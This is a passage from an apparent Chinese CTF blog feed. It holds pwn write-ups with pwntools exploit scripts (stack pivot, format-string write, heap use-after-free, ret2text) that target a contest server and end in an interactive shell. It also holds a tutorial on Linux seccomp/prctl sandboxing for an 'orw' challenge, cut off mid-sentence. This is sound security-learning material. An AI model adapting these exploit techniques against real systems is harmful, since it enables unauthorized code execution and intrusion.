remote('123.60.135.228',2131)</span><br>p = process(<span class="hljs-string">'./stack_pivotingx86'</span>)<br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br>binsh = <span class="hljs-number">0x0804A030</span><br>system_addr = <span class="hljs-number">0x08048579</span><br>leave_ret = <span class="hljs-number">0x080484d8</span><br>offset = <span class="hljs-number">0xffffd028</span> - <span class="hljs-number">0xffffcff0</span> <span class="hljs-comment">#ebp距离输入地址的值</span><br><br>pay = <span class="hljs-string">b'a'</span>*<span class="hljs-number">0x27</span> + <span class="hljs-string">b'b'</span><br>p.send(pay)<br>p.recvuntil(<span class="hljs-string">'b'</span>)<br>ebp_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">"ebp_addr -&gt; "</span>,<span class="hljs-built_in">hex</span>(ebp_addr)) <span class="hljs-comment">#泄露ebp</span><br><br>s_addr = ebp_addr - <span class="hljs-number">0x38</span> <span class="hljs-comment">#计算ebp 和 输入 的距离</span><br><br>pay1 = p32(<span class="hljs-number">0</span>)<br>pay1 += p32(system_addr)<br>pay1 += p32(binsh)<br>pay1 += p32(<span class="hljs-number">0</span>)<br>pay1 = pay1.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b'\x00'</span>)<br>pay1 += p32(s_addr)<br>pay1 += p32(leave_ret)<br>gdb.attach(p)<br>p.send(pay1)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h2 id="test-format"><a href="#test-format" class="headerlink" title="test-format"></a>test_format</h2><h3 id="程序保护-13"><a href="#程序保护-13" class="headerlink" title="程序保护-13"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路-13"></a>解题思路</h3><p>格式化字符串漏洞，修改任意位置的值</p><h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp-13"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2121</span>)<br><span class="hljs-comment">#p = process('./test_format')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br>elf = ELF(<span class="hljs-string">'./test_format'</span>)<br><br>goal = <span class="hljs-number">0x0804A030</span><br>payload = <span class="hljs-string">'aaaa%8$n'</span> + p64(goal)<br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="heap-Easy-Uaf"><a href="#heap-Easy-Uaf" class="headerlink" title="heap-Easy-Uaf"></a>heap_Easy_Uaf</h2><h3 id="程序保护-14"><a href="#程序保护-14" class="headerlink" title="程序保护-14"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-14"><a href="#解题思路-14" class="headerlink" title="解题思路-14"></a>解题思路</h3><p>漏洞存在于Are()函数中，函数malloc了一个0x71大小的堆块，但是并没有清0，存在释放后使用的可能性。在之后申请了一个chunk b，chunk b的内容存在堆溢出。我这里的思路就是如果在a的上方有个大小小于0x71，释放的chunk，程序会将b申请到a的上方，这样通过堆溢出可以修改a的内容为"Flag"，官方做法是直接 将申请的b在a中，填写b的内容为Flag也可以！</p><h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp-14"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2094</span>)<br><span class="hljs-comment">#p = process('./heap_Easy_Uaf')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br>elf = ELF(<span class="hljs-string">'./heap_Easy_Uaf'</span>)<br><span class="hljs-comment">#heaparray = 0x602100</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">xuhao</span>):<br>    p.recvuntil(<span class="hljs-string">'Please Choice!\n'</span>)<br>    p.sendline(xuhao)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    cmd(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input Size:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">'Content of Emo!:'</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    cmd(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">'Change EMo Content\n'</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">amaze</span>(<span class="hljs-params">size,content</span>):<br>    cmd(<span class="hljs-string">"5"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input Chunk size :\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">'Please Input Content : \n'</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    cmd(<span class="hljs-string">"6"</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br><br>heap_ptr = <span class="hljs-number">0x602100</span><br>shell=<span class="hljs-number">0x400A16</span><br><br>add(<span class="hljs-number">8</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">8</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#1</span><br><span class="hljs-comment">#debug()</span><br>amaze(<span class="hljs-number">8</span>,<span class="hljs-string">''</span>)<br><span class="hljs-comment">#debug()</span><br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>pay = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x71</span>) + <span class="hljs-string">"Flag"</span><br>amaze(<span class="hljs-number">8</span>,pay)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="小狗汪汪汪"><a href="#小狗汪汪汪" class="headerlink" title="小狗汪汪汪"></a>小狗汪汪汪</h2><h3 id="程序保护-15"><a href="#程序保护-15" class="headerlink" title="程序保护-15"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-15"><a href="#解题思路-15" class="headerlink" title="解题思路-15"></a>解题思路</h3><p>ret2text</p><h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp-15"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2133</span>)<br><span class="hljs-comment">#p = process('./woof')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br><br>backdoor = <span class="hljs-number">0x0804859B</span><br>p.recvuntil(<span class="hljs-string">b'This puppy needs to eat a few bones?\n'</span>)<br>payload = <span class="hljs-string">b'a'</span>*(<span class="hljs-number">0x9</span>+<span class="hljs-number">4</span>) + p32(<span class="hljs-number">0x0804859B</span>)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;PWN&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;记录一下 一次比赛的复盘，除了夕阳下的舞者有点难度之外，其他题目难度还适中，最后也是拿到了不错的排名！期待12月份的Polar D&amp;amp;N的冬季赛！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p class=&#39;item-i</summary>
      
    
    
    
    <category term="wp" scheme="https://kylinxin.github.io/categories/wp/"/>
    
    
    <category term="wp" scheme="https://kylinxin.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>prctl-seccomp-orw</title>
    <link href="https://kylinxin.github.io/2023/09/18/prctl-seccomp/"/>
    <id>https://kylinxin.github.io/2023/09/18/prctl-seccomp/</id>
    <published>2023-09-18T15:14:29.000Z</published>
    <updated>2023-09-17T16:00:21.863Z</updated>
    
    <content type="html"><![CDATA[<h1><strong>初探（Linux Kernel）sandbox中的prctl-seccomp机制（orw）</strong></h1><blockquote><p>题目来源：<a href="https://pwnable.tw/challenge/#2%EF%BC%88orw%EF%BC%89">https://pwnable.tw/challenge/#2（orw）</a><br>参考资料：<br><a href="https://www.anquanke.com/post/id/186447">https://www.anquanke.com/post/id/186447</a><br><a href="https://man7.org/linux/man-pages/man2/prctl.2.html">https://man7.org/linux/man-pages/man2/prctl.2.html</a><br><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a><br>附件：<br>链接: <a href="https://pan.baidu.com/s/1ppU1-qZEBHQtNcrTwzXx-A">https://pan.baidu.com/s/1ppU1-qZEBHQtNcrTwzXx-A</a>  密码: hvqc<br>–来自百度网盘超级会员V3的分享</p></blockquote><h2 id="prctl-seccomp-简介"><a href="#prctl-seccomp-简介" class="headerlink" title="prctl-seccomp-简介"></a>prctl-seccomp 简介</h2><p>seccomp 是 secure computing 的缩写，其是从 Linux kernel 2.6.23版本引入的一种简洁的 sandbox 机制，可以当作沙箱使用。在编写C语言程序过程中，可以通过引入prctl函数来实现内核级的安全机制；程序编译运行后，相当于进程进入到一种“安全”运行模式。为什么要引入这样一种安全机制？正常情况下在 Linux 系统里，大量的系统调用（system call）会直接暴露给用户态程序，也就是说程序可以使用所有的syscall，此时如果劫持程序流程通过exeve或system来调用syscall就会获得用户态的shell权限。可以看到并不是所有的系统调用都被需要，不安全的代码滥用系统调用会对系统造成安全威胁。为了防范这种攻击方式，这时seccomp就派上了用场，在严格模式下的进程只能调用4种系统调用，即 read()、write()、 exit() 和 sigreturn()，其他的系统调用都会杀死进程，过滤模式下可以指定允许那些系统调用，规则是bpf，可以使用seccomp-tools查看。</p><blockquote><p>sandbox：沙箱、沙盒</p></blockquote><h2 id="使用seccomp-tools查看可用系统调用（识别沙箱规则）"><a href="#使用seccomp-tools查看可用系统调用（识别沙箱规则）" class="headerlink" title="使用seccomp-tools查看可用系统调用（识别沙箱规则）"></a>使用seccomp-tools查看可用系统调用（识别沙箱规则）</h2><blockquote><p>安装方式：<a href="https://github.com/david942j/seccomp-tools">https://github.com/david942j/seccomp-tools</a></p><p>$ gem install seccomp-tools</p><p>sudo apt install gcc ruby-dev</p></blockquote><p>执行如下图中命令即可查看此ELF文件中可用的系统调用：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">ctfshow@ubuntu:/mnt/hgfs/PWN题/Range/pwnable.xyz$ seccomp-tools dump ./orww<br> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000ad</span>  <span class="hljs-keyword">if</span> (A == rt_sigreturn) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000077</span>  <span class="hljs-keyword">if</span> (A == sigreturn) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000fc</span>  <span class="hljs-keyword">if</span> (A == exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-built_in">exit</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000005</span>  <span class="hljs-keyword">if</span> (A == open) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">if</span> (A == write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00050026</span>  <span class="hljs-keyword">return</span> ERRNO(<span class="hljs-number">38</span>)<br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br>    <br></code></pre></td></tr></tbody></table></figure><p>##从IDA开始分析题目</p><p>将题目下载下来，我们先来看一下程序的代码，直接来到main函数：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>{<br>  orw_seccomp();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Give my your shellcode:"</span>);<br>  read(<span class="hljs-number">0</span>, &amp;shellcode, <span class="hljs-number">0xC8</span>u);<br>  ((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))shellcode)();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>进入orw_seccomp();</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">orw_seccomp</span><span class="hljs-params">()</span><br>{<br>  __int16 v1; <span class="hljs-comment">// [esp+4h] [ebp-84h] BYREF</span><br>  <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// [esp+8h] [ebp-80h]</span><br>  <span class="hljs-type">char</span> v3[<span class="hljs-number">96</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-7Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp+6Ch] [ebp-1Ch]</span><br><br>  v4 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  qmemcpy(v3, &amp;unk_8048640, <span class="hljs-keyword">sizeof</span>(v3));<br>  v1 = <span class="hljs-number">12</span>;<br>  v2 = v3;<br>  prctl(<span class="hljs-number">38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>  prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2</span>, &amp;v1);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v4;<br>}<br></code></pre></td></tr></tbody></table></figure><p>我们注意一下代码中的两个prctl：</p><blockquote><p>prctl(38, 1, 0, 0, 0)</p><p>prctl(22, 2, &amp;v1);</p></blockquote><p>先记住这两个函数，接下来会提到，这里暂时先放一放。</p><h2 id="prctl函数原型"><a href="#prctl函数原型" class="headerlink" title="prctl函数原型"></a>prctl函数原型</h2><p>看一下这个函数的原型：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">prctl</span><span class="hljs-params">(<span class="hljs-type">int</span> option, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg2, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg3, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg4, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg5)</span>; <br></code></pre></td></tr></tbody></table></figure><p>函数中有5个参数，重点来看一下参数中的“int option”，因为option的中文本意是选择，了解了这个参数我们也就知道整个函数要干嘛，这里我们需要重点关注两个选项：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">PR_SET_NO_NEW_PRIVS<br>PR_SET_SECCOMP<br></code></pre></td></tr></tbody></table></figure><p>先来看第一个，PR_SET_NO_NEW_PRIVS：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">Set the calling thread<span class="hljs-number">'</span>s no_new_privs attribute to the<br>value in arg2.  With no_new_privs <span class="hljs-built_in">set</span> to <span class="hljs-number">1</span>, execve(<span class="hljs-number">2</span>)<br>promises not to grant privileges to <span class="hljs-keyword">do</span> anything that could<br>not have been done without the <span class="hljs-title function_">execve</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span> <span class="hljs-title function_">call</span> <span class="hljs-params">(<span class="hljs-keyword">for</span></span><br><span class="hljs-params">example, rendering the <span class="hljs-built_in">set</span>-user-ID and <span class="hljs-built_in">set</span>-group-ID mode</span><br><span class="hljs-params">bits, and file capabilities non-functional)</span>.  Once <span class="hljs-built_in">set</span>,<br>the no_new_privs attribute cannot be unset.  The setting<br>of this attribute is inherited by children created by<br><span class="hljs-title function_">fork</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span> and <span class="hljs-title function_">clone</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>, and preserved across <span class="hljs-title function_">execve</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>.<br></code></pre></td></tr></tbody></table></figure><p>简单的说，如果 option 设置为 PR_SET_NO_NEW_PRIVS并且第二个参数（unsigned long arg2）设置为 1，那么这个可执行文件不能够进行execve的系统调用（system 函数、one_gadget失效，但是其他的系统调用仍可以正常运行），同时这个选项还会继承给子进程。放到prctl函数中就是：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">prctl(PR_SET_NO_NEW_PRIVS,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);     <span class="hljs-comment">//设为1</span><br></code></pre></td></tr></tbody></table></figure><blockquote><p><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/">https://blog.betamao.me/2019/01/23/Linux沙箱之seccomp/</a><br>在早期使用seccomp是使用prctl系统调用实现的，后来封装成了一个libseccomp库，可以直接使用seccomp_init,seccomp_rule_add,seccomp_load来设置过滤规则，但是我们学习的还是从prctl，这个系统调用是进行进程控制的，这里关注seccomp功能。<br>首先，要使用它需要有CAP_SYS_ADMIN权能，否则就要设置PR_SET_NO_NEW_PRIVS位，若不这样做非root用户使用这个程序时seccomp保护将会失效！设置了PR_SET_NO_NEW_PRIVS位后能保证seccomp对所有用户都能起作用，并且会使子进程即execve后的进程依然受控，意思就是即使执行execve这个系统调用替换了整个binary权限不会变化，而且正如其名它设置以后就不能再改了，即使可以调用ptctl也不能再把它禁用掉。</p></blockquote><p>在 include/linux/prctl.h 中找到 PR_SET_NO_NEW_PRIVS 常量对应的数值，正好是 38，因此也就对应上了上述题目中的第一个 prctl 语句。</p><p class='item-img' data-src='https://s2.loli.net/2023/09/14/6MpQe2EbhANUcPH.png'><img src="https://s2.loli.net/2023/09/14/6MpQe2EbhANUcPH.png" alt="Snipaste_2023-09-14_23-07-36.png"></p><p>接着看第二个options PR_SET_SECCOMP：</p><blockquote><p>Set the secure computing (seccomp) mode for the calling thread,</p><p>to limit the available system calls.</p></blockquote><p>一句话，这个参数是用来设置 seccomp ，其实也就是设置沙箱是否开启。<br>常常与它在prctl出现的还有如下两个参数：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">SECCOMP_MODE_STRICT：<br>    the only system calls that the thread is permitted to make are <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>,<br><span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>,_<span class="hljs-title function_">exit</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span> <span class="hljs-params">(but not exit_group(<span class="hljs-number">2</span>))</span>, and <span class="hljs-title function_">sigreturn</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>. <br><br><span class="hljs-title function_">SECCOMP_MODE_FILTER</span> <span class="hljs-params">(since Linux <span class="hljs-number">3.5</span>)</span>：<br>    the system calls allowed are defined by a pointer to a Berkeley Packet <br>    Filter passed in arg3.  This argument is a pointer to <span class="hljs-keyword">struct</span> sock_fprog; <br>it can be designed to filter arbitrary system calls and system call arguments.<br>  <br><span class="hljs-number">1</span>、SECCOMP_MODE*<span class="hljs-title function_">STRICT</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span>：<br>允许线程进行的唯一系统调用是read（2），write（2），*<span class="hljs-built_in">exit</span>（2）（但不是exit_group（2））<br>    和sigreturn（2）。<br><br>2、<span class="hljs-title function_">SECCOMP_MODE_FILTER</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span> <span class="hljs-params">(since Linux <span class="hljs-number">3.5</span>)</span>：<br>    允许的系统调用由指向arg3中传递的Berkeley Packet Filter的指针定义。 <br>    这个参数是一个指向<span class="hljs-keyword">struct</span> sock_fprog的指针; 它可以设计为过滤任意系统调用和系统调用参数<br></code></pre></td></tr></tbody></table></figure><p>上述英文大概说的是如果设置了 SECCOMP_MODE_STRICT 模式的话，系统调用只能使用 read, write,_exit 这三个。如果设置了 SECCOMP_MODE_FILTER 的话，系统调用规则就可以被 Berkeley Packet 